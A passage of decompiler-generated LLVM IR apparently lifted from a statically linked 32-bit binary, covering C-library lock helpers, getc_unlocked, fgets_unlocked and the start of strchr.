  %v1_8054d9e = add i32 %v0_8054d9e, 56
  %v2_8054d9e = inttoptr i32 %v1_8054d9e to i32*
  %v3_8054d9e = load i32, i32* %v2_8054d9e, align 4
  %v4_8054d9e = add i32 %v3_8054d9e, -1
  %v12_8054d9e = icmp eq i32 %v4_8054d9e, 0
  store i32 %v4_8054d9e, i32* %v2_8054d9e, align 4
  %v1_8054da3 = icmp eq i1 %v12_8054d9e, false
  call void @__pseudo_cond_branch(i1 %v1_8054da3, i32 134565488)
  ret i32 %v1_8054d85

; uselistorder directives
  uselistorder i32 %v4_8054d9e, { 1, 0 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 4, 12, 11, 40, 38, 9, 10, 3, 5, 2, 6, 7, 1, 8, 13, 41, 0 }
  uselistorder i32 60, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 10, 9, 16, 8, 2, 1, 4, 3, 11, 12, 5, 13, 14, 6, 15, 7, 0 }
  uselistorder label %dec_label_pc_8054d79, { 2, 1, 0 }
}

define i32 @function_8054da9() local_unnamed_addr {
dec_label_pc_8054da9:
  %v4_8054da9 = load i32, i32* @eax, align 4
  ret i32 %v4_8054da9
}

define i32 @function_8054dac() local_unnamed_addr {
dec_label_pc_8054dac:
  %v0_8054dac = load i32, i32* @ebx, align 4
  %v1_8054dac = icmp eq i32 %v0_8054dac, 0
  %v1_8054dae = icmp eq i1 %v1_8054dac, false
  call void @__pseudo_cond_branch(i1 %v1_8054dae, i32 134565143)
  %v0_8054db4 = call i32 @_stdio_openlist_dec_use()
  %v0_8054ddc = load i32, i32* @edi, align 4
  ret i32 %v0_8054ddc

; uselistorder directives
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 21, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 99, 100, 101, 102, 103, 9, 10, 11, 6, 7, 8, 104, 105, 106, 96, 97, 98, 0, 1, 2, 3, 4, 5 }
}

define i32 @_L_lock_12() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @ecx, align 4
  %v0_8054de9 = call i32 @__lll_lock_wait_private()
  %v0_8054dee = call i32 @function_8054b14()
  ret i32 %v0_8054dee
}

define i32 @_L_lock_29() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @ecx, align 4
  %v0_8054df9 = call i32 @__lll_lock_wait_private()
  %v0_8054dfe = call i32 @function_8054b5e()
  ret i32 %v0_8054dfe
}

define i32 @_L_unlock_86() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @eax, align 4
  %v0_8054e09 = call i32 @__lll_unlock_wake_private()
  %v0_8054e0e = call i32 @function_8054bdb()
  ret i32 %v0_8054e0e
}

define i32 @_L_unlock_102() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @eax, align 4
  %v0_8054e19 = call i32 @__lll_unlock_wake_private()
  store i32 %v0_8054e19, i32* @eax, align 4
  %v0_8054e1e = call i32 @function_8054c21()
  ret i32 %v0_8054e1e
}

define i32 @_L_lock_140() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @ecx, align 4
  %v0_8054e29 = call i32 @__lll_lock_wait_private()
  %v0_8054e2e = call i32 @function_8054c75()
  ret i32 %v0_8054e2e
}

define i32 @_L_unlock_152() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @eax, align 4
  %v0_8054e39 = call i32 @__lll_unlock_wake_private()
  %v0_8054e3e = call i32 @function_8054cb2()
  ret i32 %v0_8054e3e
}

define i32 @_L_lock_160() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @ecx, align 4
  %v0_8054e49 = call i32 @__lll_lock_wait_private()
  %v0_8054e4e = call i32 @function_8054cd9()
  ret i32 %v0_8054e4e
}

define i32 @_L_unlock_170() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @eax, align 4
  %v0_8054e59 = call i32 @__lll_unlock_wake_private()
  %v0_8054e5e = call i32 @function_8054d10()
  ret i32 %v0_8054e5e
}

define i32 @_L_lock_191() local_unnamed_addr {
entry:
  %v0_8054e63 = load i32, i32* @ebx, align 4
  %v1_8054e63 = add i32 %v0_8054e63, 56
  store i32 %v1_8054e63, i32* @ecx, align 4
  %v0_8054e66 = call i32 @__lll_lock_wait_private()
  %v0_8054e6b = call i32 @function_8054d4a()
  ret i32 %v0_8054e6b

; uselistorder directives
  uselistorder i32 ()* @__lll_lock_wait_private, { 3, 2, 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 12 }
}

define i32 @_L_unlock_232() local_unnamed_addr {
entry:
  %v0_8054e70 = load i32, i32* @ebx, align 4
  %v1_8054e70 = add i32 %v0_8054e70, 56
  store i32 %v1_8054e70, i32* @eax, align 4
  %v0_8054e73 = call i32 @__lll_unlock_wake_private()
  store i32 %v0_8054e73, i32* @eax, align 4
  %v0_8054e78 = call i32 @function_8054da9()
  ret i32 %v0_8054e78

; uselistorder directives
  uselistorder i32 ()* @__lll_unlock_wake_private, { 4, 3, 2, 1, 0, 11, 10, 9, 8, 7, 6, 5, 12 }
  uselistorder i32 56, { 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 13, 14, 11, 12, 19, 7, 0, 2, 1, 3, 15, 16, 17, 5, 6, 18, 8, 9, 10, 4 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v0_8054e80 = load i32, i32* @ebx, align 4
  %v4_8054e84 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054e84, i32* @ebx, align 4
  %v1_8054e88 = add i32 %v4_8054e84, 16
  %v2_8054e88 = inttoptr i32 %v1_8054e88 to i32*
  %v3_8054e88 = load i32, i32* %v2_8054e88, align 4
  %v2_8054e8b = add i32 %v4_8054e84, 24
  %v3_8054e8b = inttoptr i32 %v2_8054e8b to i32*
  %v4_8054e8b = load i32, i32* %v3_8054e8b, align 4
  %v10_8054e8b = icmp ult i32 %v3_8054e88, %v4_8054e8b
  br i1 %v10_8054e8b, label %dec_label_pc_8054f20, label %dec_label_pc_8054e94

dec_label_pc_8054e94:                             ; preds = %entry
  %v2_8054e94 = load i16, i16* %arg1, align 2
  %v3_8054e94 = zext i16 %v2_8054e94 to i32
  %v1_8054e97 = and i32 %v3_8054e94, 131
  %v6_8054ea1 = icmp ugt i32 %v1_8054e97, 128
  br i1 %v6_8054ea1, label %dec_label_pc_8054eb8, label %dec_label_pc_8054ea3

dec_label_pc_8054ea3:                             ; preds = %dec_label_pc_8054e94
  %v6_8054ea9 = call i32 @__stdio_trans2r_o(i16* nonnull %arg1, i32 128, i32 %v0_8054e80)
  %v3_8054eae = ptrtoint i16* %arg1 to i32
  store i32 %v3_8054eae, i32* %edx.global-to-local, align 4
  %v1_8054eaf = icmp eq i32 %v6_8054ea9, 0
  %v1_8054eb2 = icmp eq i1 %v1_8054eaf, false
  br i1 %v1_8054eb2, label %dec_label_pc_8054f44, label %dec_label_pc_8054ea3.dec_label_pc_8054eb8_crit_edge

dec_label_pc_8054ea3.dec_label_pc_8054eb8_crit_edge: ; preds = %dec_label_pc_8054ea3
  %v0_8054eb8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054eb8

dec_label_pc_8054eb8:                             ; preds = %dec_label_pc_8054ea3.dec_label_pc_8054eb8_crit_edge, %dec_label_pc_8054e94
  %v2_8054eec = phi i32 [ %v0_8054eb8.pre, %dec_label_pc_8054ea3.dec_label_pc_8054eb8_crit_edge ], [ %v4_8054e84, %dec_label_pc_8054e94 ]
  %v1_8054eb8 = inttoptr i32 %v2_8054eec to i32*
  %v2_8054eb8 = load i32, i32* %v1_8054eb8, align 4
  %v1_8054eba = urem i32 %v2_8054eb8, 65536
  store i32 %v1_8054eba, i32* %edx.global-to-local, align 4
  %v2_8054ebd = and i32 %v2_8054eb8, 2
  %v3_8054ebd = icmp eq i32 %v2_8054ebd, 0
  br i1 %v3_8054ebd, label %dec_label_pc_8054edb, label %dec_label_pc_8054ec2

dec_label_pc_8054ec2:                             ; preds = %dec_label_pc_8054eb8
  %v1_8054ec2 = urem i32 %v2_8054eb8, 2
  store i32 %v1_8054ec2, i32* %edx.global-to-local, align 4
  %v1_8054ec5 = add i32 %v2_8054eb8, 65535
  %v1_8054ec8 = trunc i32 %v1_8054ec5 to i16
  %v3_8054ec8 = inttoptr i32 %v2_8054eec to i16*
  store i16 %v1_8054ec8, i16* %v3_8054ec8, align 2
  %v0_8054ecb = load i32, i32* @ebx, align 4
  %v1_8054ecb = load i32, i32* %edx.global-to-local, align 4
  %v2_8054ecb = mul i32 %v1_8054ecb, 4
  %v3_8054ecb = add i32 %v0_8054ecb, 36
  %v4_8054ecb = add i32 %v3_8054ecb, %v2_8054ecb
  %v5_8054ecb = inttoptr i32 %v4_8054ecb to i8*
  %v6_8054ecb = load i8, i8* %v5_8054ecb, align 1
  %v7_8054ecb = zext i8 %v6_8054ecb to i32
  %v9_8054ecb = and i32 %v1_8054ecb, -256
  %v10_8054ecb = or i32 %v7_8054ecb, %v9_8054ecb
  store i32 %v10_8054ecb, i32* %edx.global-to-local, align 4
  %v1_8054ecf = add i32 %v0_8054ecb, 40
  %v2_8054ecf = inttoptr i32 %v1_8054ecf to i32*
  store i32 0, i32* %v2_8054ecf, align 4
  %v0_8054ed6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ed6 = urem i32 %v0_8054ed6, 256
  store i32 %v1_8054ed6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f47

dec_label_pc_8054edb:                             ; preds = %dec_label_pc_8054eb8
  %v1_8054edb = add i32 %v2_8054eec, 16
  %v2_8054edb = inttoptr i32 %v1_8054edb to i32*
  %v3_8054edb = load i32, i32* %v2_8054edb, align 4
  %v1_8054ede = add i32 %v2_8054eec, 20
  %v2_8054ede = inttoptr i32 %v1_8054ede to i32*
  %v3_8054ede = load i32, i32* %v2_8054ede, align 4
  %v15_8054ede = icmp eq i32 %v3_8054ede, %v3_8054edb
  %v1_8054ee1 = icmp eq i1 %v15_8054ede, false
  br i1 %v1_8054ee1, label %dec_label_pc_8054f20, label %dec_label_pc_8054ee3

dec_label_pc_8054ee3:                             ; preds = %dec_label_pc_8054edb
  %v1_8054ee3 = add i32 %v2_8054eec, 4
  %v2_8054ee3 = inttoptr i32 %v1_8054ee3 to i32*
  %v3_8054ee3 = load i32, i32* %v2_8054ee3, align 4
  %v13_8054ee3 = icmp eq i32 %v3_8054ee3, -2
  %v1_8054ee7 = icmp eq i1 %v13_8054ee3, false
  br i1 %v1_8054ee7, label %dec_label_pc_8054ef1, label %dec_label_pc_8054ee9

dec_label_pc_8054ee9:                             ; preds = %dec_label_pc_8054ee3
  %v1_8054ee9 = or i32 %v2_8054eb8, 4
  %v1_8054eec = trunc i32 %v1_8054ee9 to i16
  %v3_8054eec = inttoptr i32 %v2_8054eec to i16*
  store i16 %v1_8054eec, i16* %v3_8054eec, align 2
  br label %dec_label_pc_8054f44

dec_label_pc_8054ef1:                             ; preds = %dec_label_pc_8054ee3
  %v1_8054ef1 = udiv i32 %v2_8054eb8, 256
  %v2_8054ef1 = trunc i32 %v1_8054ef1 to i8
  %v3_8054ef1 = urem i8 %v2_8054ef1, 4
  %v4_8054ef1 = icmp eq i8 %v3_8054ef1, 0
  %v8_8054ef1 = zext i8 %v3_8054ef1 to i32
  %v10_8054ef1 = mul nuw nsw i32 %v8_8054ef1, 256
  %v11_8054ef1 = urem i32 %v2_8054eb8, 256
  %v12_8054ef1 = or i32 %v10_8054ef1, %v11_8054ef1
  store i32 %v12_8054ef1, i32* %edx.global-to-local, align 4
  br i1 %v4_8054ef1, label %dec_label_pc_8054f01, label %dec_label_pc_8054ef6

dec_label_pc_8054ef6:                             ; preds = %dec_label_pc_8054ef1
  %v2_8054efb = call i32 @fflush_unlocked(i32 ptrtoint (i32** @global_var_8057c18.322 to i32))
  %v0_8054f01.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054f01

dec_label_pc_8054f01:                             ; preds = %dec_label_pc_8054ef1, %dec_label_pc_8054ef6
  %v0_8054f30 = phi i32 [ %v2_8054eec, %dec_label_pc_8054ef1 ], [ %v0_8054f01.pre, %dec_label_pc_8054ef6 ]
  %v1_8054f01 = add i32 %v0_8054f30, 8
  %v2_8054f01 = inttoptr i32 %v1_8054f01 to i32*
  %v3_8054f01 = load i32, i32* %v2_8054f01, align 4
  %v1_8054f04 = add i32 %v0_8054f30, 12
  %v2_8054f04 = inttoptr i32 %v1_8054f04 to i32*
  %v3_8054f04 = load i32, i32* %v2_8054f04, align 4
  %v15_8054f04 = icmp eq i32 %v3_8054f04, %v3_8054f01
  br i1 %v15_8054f04, label %dec_label_pc_8054f29, label %dec_label_pc_8054f09

dec_label_pc_8054f09:                             ; preds = %dec_label_pc_8054f01
  %v2_8054f09 = add i32 %v0_8054f30, 24
  %v3_8054f09 = inttoptr i32 %v2_8054f09 to i32*
  store i32 %v3_8054f01, i32* %v3_8054f09, align 4
  %v0_8054f0c = load i32, i32* @ebx, align 4
  %v2_8054f0d = call i32 @__stdio_rfill(i32 %v0_8054f0c)
  %v1_8054f13 = icmp eq i32 %v2_8054f0d, 0
  br i1 %v1_8054f13, label %dec_label_pc_8054f44, label %dec_label_pc_8054f17

dec_label_pc_8054f17:                             ; preds = %dec_label_pc_8054f09
  %v0_8054f17 = load i32, i32* @ebx, align 4
  %v1_8054f17 = add i32 %v0_8054f17, 20
  %v2_8054f17 = inttoptr i32 %v1_8054f17 to i32*
  %v3_8054f17 = load i32, i32* %v2_8054f17, align 4
  %v2_8054f1a = add i32 %v0_8054f17, 24
  %v3_8054f1a = inttoptr i32 %v2_8054f1a to i32*
  store i32 %v3_8054f17, i32* %v3_8054f1a, align 4
  %v0_8054f1d = load i32, i32* @ebx, align 4
  %v1_8054f1d = add i32 %v0_8054f1d, 16
  %v2_8054f1d = inttoptr i32 %v1_8054f1d to i32*
  %v3_8054f1d = load i32, i32* %v2_8054f1d, align 4
  br label %dec_label_pc_8054f20

dec_label_pc_8054f20:                             ; preds = %dec_label_pc_8054edb, %entry, %dec_label_pc_8054f17
  %v1_8054f24 = phi i32 [ %v2_8054eec, %dec_label_pc_8054edb ], [ %v4_8054e84, %entry ], [ %v0_8054f1d, %dec_label_pc_8054f17 ]
  %v0_8054f20 = phi i32 [ %v3_8054edb, %dec_label_pc_8054edb ], [ %v3_8054e88, %entry ], [ %v3_8054f1d, %dec_label_pc_8054f17 ]
  %v1_8054f20 = inttoptr i32 %v0_8054f20 to i8*
  %v2_8054f20 = load i8, i8* %v1_8054f20, align 1
  %v3_8054f20 = zext i8 %v2_8054f20 to i32
  store i32 %v3_8054f20, i32* %edx.global-to-local, align 4
  %v1_8054f23 = add i32 %v0_8054f20, 1
  %v2_8054f24 = add i32 %v1_8054f24, 16
  %v3_8054f24 = inttoptr i32 %v2_8054f24 to i32*
  store i32 %v1_8054f23, i32* %v3_8054f24, align 4
  %v0_8054f47.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f47

dec_label_pc_8054f29:                             ; preds = %dec_label_pc_8054f01
  %v2_8054f2b = ptrtoint i8* %stack_var_-5 to i32
  %v5_8054f30 = inttoptr i32 %v0_8054f30 to i16*
  %v7_8054f31 = call i32 @__stdio_READ(i16* %v5_8054f30, i32 %v2_8054f2b, i32 1)
  %v1_8054f39 = icmp eq i32 %v7_8054f31, 0
  br i1 %v1_8054f39, label %dec_label_pc_8054f44, label %dec_label_pc_8054f3d

dec_label_pc_8054f3d:                             ; preds = %dec_label_pc_8054f29
  %v3_8054f3d = load i8, i8* %stack_var_-5, align 1
  %v4_8054f3d = sext i8 %v3_8054f3d to i32
  store i32 %v4_8054f3d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f47

dec_label_pc_8054f44:                             ; preds = %dec_label_pc_8054f29, %dec_label_pc_8054f09, %dec_label_pc_8054ea3, %dec_label_pc_8054ee9
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f47

dec_label_pc_8054f47:                             ; preds = %dec_label_pc_8054f3d, %dec_label_pc_8054f20, %dec_label_pc_8054ec2, %dec_label_pc_8054f44
  %v0_8054f47 = phi i32 [ %v4_8054f3d, %dec_label_pc_8054f3d ], [ %v0_8054f47.pre, %dec_label_pc_8054f20 ], [ %v1_8054ed6, %dec_label_pc_8054ec2 ], [ -1, %dec_label_pc_8054f44 ]
  %v2_8054f49 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054f49, i32* %edx.global-to-local, align 4
  store i32 %v0_8054e80, i32* @ebx, align 4
  ret i32 %v0_8054f47

; uselistorder directives
  uselistorder i32 %v0_8054f20, { 1, 0 }
  uselistorder i32 %v3_8054f01, { 1, 0 }
  uselistorder i32 %v0_8054f30, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8054ef1, { 1, 0 }
  uselistorder i32 %v3_8054edb, { 1, 0 }
  uselistorder i32 %v1_8054ed6, { 1, 0 }
  uselistorder i32 %v2_8054eb8, { 1, 0, 4, 5, 2, 6, 3 }
  uselistorder i32 %v2_8054eec, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8057c20.308, { 2, 1, 0 }
  uselistorder i32 36, { 20, 6, 13, 11, 10, 0, 7, 1, 8, 3, 12, 9, 2, 15, 14, 16, 17, 5, 18, 4, 19 }
  uselistorder i32 65535, { 0, 8, 6, 7, 9, 10, 11, 12, 13, 1, 14, 15, 16, 36, 17, 18, 2, 3, 19, 20, 21, 22, 4, 5, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37 }
  uselistorder i32 128, { 7, 8, 12, 13, 10, 9, 0, 11, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 131, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8054f47, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8054f44, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8054f20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054f01, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054f4e = load i32, i32* @esi, align 4
  %v0_8054f4f = load i32, i32* @ebx, align 4
  store i32 %v0_8054f4f, i32* %stack_var_-16, align 4
  %v4_8054f50 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054f50, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8054f50, i32* @ebx, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8054f95.preheader, label %dec_label_pc_8054fa1

dec_label_pc_8054f95.preheader:                   ; preds = %entry
  %v1_8054f955 = add i32 %arg2, -1
  %v8_8054f959 = icmp eq i32 %v1_8054f955, 0
  store i32 %v1_8054f955, i32* @esi, align 4
  %v1_8054f9611 = icmp eq i1 %v8_8054f959, false
  br i1 %v1_8054f9611, label %dec_label_pc_8054f64.lr.ph, label %dec_label_pc_8054f98

dec_label_pc_8054f64.lr.ph:                       ; preds = %dec_label_pc_8054f95.preheader
  br label %dec_label_pc_8054f64

dec_label_pc_8054f64:                             ; preds = %dec_label_pc_8054f95.backedge.dec_label_pc_8054f64_crit_edge, %dec_label_pc_8054f64.lr.ph
  %v0_8054f7a = phi i32 [ %v0_8054f64.pre, %dec_label_pc_8054f95.backedge.dec_label_pc_8054f64_crit_edge ], [ %arg3, %dec_label_pc_8054f64.lr.ph ]
  %v1_8054f64 = add i32 %v0_8054f7a, 16
  %v2_8054f64 = inttoptr i32 %v1_8054f64 to i32*
  %v3_8054f64 = load i32, i32* %v2_8054f64, align 4
  store i32 %v3_8054f64, i32* %eax.global-to-local, align 4
  %v2_8054f67 = add i32 %v0_8054f7a, 24
  %v3_8054f67 = inttoptr i32 %v2_8054f67 to i32*
  %v4_8054f67 = load i32, i32* %v3_8054f67, align 4
  %v10_8054f67 = icmp ult i32 %v3_8054f64, %v4_8054f67
  %v1_8054f6a = icmp eq i1 %v10_8054f67, false
  br i1 %v1_8054f6a, label %dec_label_pc_8054f7a, label %dec_label_pc_8054f6c

dec_label_pc_8054f6c:                             ; preds = %dec_label_pc_8054f64
  %v1_8054f6c = inttoptr i32 %v3_8054f64 to i8*
  %v2_8054f6c = load i8, i8* %v1_8054f6c, align 1
  %v3_8054f6c = zext i8 %v2_8054f6c to i32
  %v4_8054f6c = load i32, i32* @edx, align 4
  %v5_8054f6c = and i32 %v4_8054f6c, -256
  %v6_8054f6c = or i32 %v5_8054f6c, %v3_8054f6c
  store i32 %v6_8054f6c, i32* @edx, align 4
  %v1_8054f6e = add i32 %v3_8054f64, 1
  store i32 %v1_8054f6e, i32* %eax.global-to-local, align 4
  %v2_8054f6f = load i32, i32* @ebx, align 4
  %v3_8054f6f = inttoptr i32 %v2_8054f6f to i8*
  store i8 %v2_8054f6c, i8* %v3_8054f6f, align 1
  %v0_8054f71 = load i32, i32* @ebx, align 4
  %v1_8054f71 = add i32 %v0_8054f71, 1
  store i32 %v1_8054f71, i32* @ebx, align 4
  %v0_8054f72 = load i32, i32* @edx, align 4
  %v1_8054f72 = trunc i32 %v0_8054f72 to i8
  %v10_8054f72 = icmp eq i8 %v1_8054f72, 10
  %v0_8054f75 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054f75 = load i32, i32* @ebp, align 4
  %v2_8054f75 = add i32 %v1_8054f75, 16
  %v3_8054f75 = inttoptr i32 %v2_8054f75 to i32*
  store i32 %v0_8054f75, i32* %v3_8054f75, align 4
  br i1 %v10_8054f72, label %dec_label_pc_8054f98, label %dec_label_pc_8054f95.backedge

dec_label_pc_8054f7a:                             ; preds = %dec_label_pc_8054f64
  %tmp24 = inttoptr i32 %v0_8054f7a to i16*
  %v3_8054f7b = call i32 @getc_unlocked(i16* %tmp24)
  %v4_8054f7b = trunc i32 %v3_8054f7b to i8
  store i32 %v3_8054f7b, i32* %eax.global-to-local, align 4
  store i32 %v0_8054f7a, i32* @edx, align 4
  %sext.mask = urem i32 %v3_8054f7b, 256
  %v11_8054f81 = icmp eq i32 %sext.mask, 255
  %v1_8054f84 = icmp eq i1 %v11_8054f81, false
  br i1 %v1_8054f84, label %dec_label_pc_8054f93, label %dec_label_pc_8054f86

dec_label_pc_8054f86:                             ; preds = %dec_label_pc_8054f7a
  %v0_8054f86 = load i32, i32* @ebp, align 4
  %v1_8054f86 = inttoptr i32 %v0_8054f86 to i8*
  %v2_8054f86 = load i8, i8* %v1_8054f86, align 1
  %v3_8054f86 = and i8 %v2_8054f86, 8
  %v4_8054f86 = icmp eq i8 %v3_8054f86, 0
  br i1 %v4_8054f86, label %dec_label_pc_8054f98, label %dec_label_pc_8054fa1

dec_label_pc_8054f93:                             ; preds = %dec_label_pc_8054f7a
  %v3_8054f8e = load i32, i32* @ebx, align 4
  %v4_8054f8e = inttoptr i32 %v3_8054f8e to i8*
  store i8 %v4_8054f7b, i8* %v4_8054f8e, align 1
  %v0_8054f90 = load i32, i32* @ebx, align 4
  %v1_8054f90 = add i32 %v0_8054f90, 1
  store i32 %v1_8054f90, i32* @ebx, align 4
  %v11_8054f91 = icmp eq i8 %v4_8054f7b, 10
  br i1 %v11_8054f91, label %dec_label_pc_8054f98, label %dec_label_pc_8054f95.backedge

dec_label_pc_8054f95.backedge:                    ; preds = %dec_label_pc_8054f93, %dec_label_pc_8054f6c
  %v0_8054f95 = load i32, i32* @esi, align 4
  %v1_8054f95 = add i32 %v0_8054f95, -1
  %v8_8054f95 = icmp eq i32 %v1_8054f95, 0
  store i32 %v1_8054f95, i32* @esi, align 4
  %v1_8054f96 = icmp eq i1 %v8_8054f95, false
  br i1 %v1_8054f96, label %dec_label_pc_8054f95.backedge.dec_label_pc_8054f64_crit_edge, label %dec_label_pc_8054f98

dec_label_pc_8054f95.backedge.dec_label_pc_8054f64_crit_edge: ; preds = %dec_label_pc_8054f95.backedge
  %v0_8054f64.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8054f64

dec_label_pc_8054f98:                             ; preds = %dec_label_pc_8054f95.backedge, %dec_label_pc_8054f93, %dec_label_pc_8054f6c, %dec_label_pc_8054f95.preheader, %dec_label_pc_8054f86
  %v0_8054f98 = load i32, i32* @ebx, align 4
  %v1_8054f98 = load i32, i32* @edi, align 4
  %tmp25 = icmp ugt i32 %v0_8054f98, %v1_8054f98
  br i1 %tmp25, label %dec_label_pc_8054f9c, label %dec_label_pc_8054fa1

dec_label_pc_8054f9c:                             ; preds = %dec_label_pc_8054f98
  %v1_8054f9c = inttoptr i32 %v0_8054f98 to i8*
  store i8 0, i8* %v1_8054f9c, align 1
  %v0_8054fa3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054fa3

dec_label_pc_8054fa1:                             ; preds = %dec_label_pc_8054f98, %dec_label_pc_8054f86, %entry
  br label %dec_label_pc_8054fa3

dec_label_pc_8054fa3:                             ; preds = %dec_label_pc_8054f9c, %dec_label_pc_8054fa1
  %v0_8054fa3 = phi i32 [ %v0_8054fa3.pre, %dec_label_pc_8054f9c ], [ 0, %dec_label_pc_8054fa1 ]
  store i32 %v0_8054fa3, i32* %eax.global-to-local, align 4
  %v2_8054fa5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054fa5, i32* @ebx, align 4
  store i32 %v0_8054f4e, i32* @esi, align 4
  ret i32 %v0_8054fa3

; uselistorder directives
  uselistorder i32 %v0_8054fa3, { 1, 0 }
  uselistorder i32 %v0_8054f98, { 1, 0 }
  uselistorder i32 %v1_8054f95, { 1, 0 }
  uselistorder i32 %v3_8054f7b, { 0, 2, 1 }
  uselistorder i32 %v0_8054f7a, { 0, 1, 3, 2 }
  uselistorder i32 255, { 0, 2, 4, 5, 11, 3, 6, 8, 10, 9, 7, 1 }
  uselistorder i32 (i16*)* @getc_unlocked, { 1, 2, 0, 3 }
  uselistorder i32* @ebp, { 1, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 213, 211, 212, 214, 215, 254, 255, 188, 187, 2, 8, 189, 191, 190, 3, 9, 192, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 0, 239, 240, 216, 217, 218, 219, 220, 221, 222, 223, 241, 242, 243, 244, 245, 246, 247, 248, 4, 249, 5, 250, 251, 252, 253, 134, 135, 136, 137, 138, 17, 18, 19, 21, 7, 10, 11, 6, 12, 13, 14, 15, 16, 20, 28, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 39, 40, 34, 35, 36, 37, 38, 120, 121, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115, 112, 113, 114, 116, 117, 118, 119, 122, 123, 124, 129, 125, 126, 127, 128, 130, 131, 132, 133, 139, 140, 141, 142, 143, 144, 145, 146, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 147, 148, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 193, 194, 195, 196, 197, 198, 199 }
  uselistorder label %dec_label_pc_8054fa3, { 1, 0 }
  uselistorder label %dec_label_pc_8054f98, { 0, 1, 4, 2, 3 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8054fad = ptrtoint i8* %arg1 to i32
  %v2_8054fb5 = mul i32 %arg2, 256
  %v3_8054fb5 = and i32 %v2_8054fb5, 65280
  %v4_8054fb5 = and i32 %arg2, -65281
  %v5_8054fb5 = or i32 %v3_8054fb5, %v4_8054fb5
  %v8_8054fb7.pre = load i1, i1* @df, align 1
  %v9_8054fb7 = select i1 %v8_8054fb7.pre, i32 -1, i32 1
  br label %dec_label_pc_8054fb7

dec_label_pc_8054fb7:                             ; preds = %dec_label_pc_8054fbc, %entry
  %v4_8054fb7 = phi i32 [ %v6_8054fb7, %dec_label_pc_8054fbc ], [ %v5_8054fb5, %entry ]
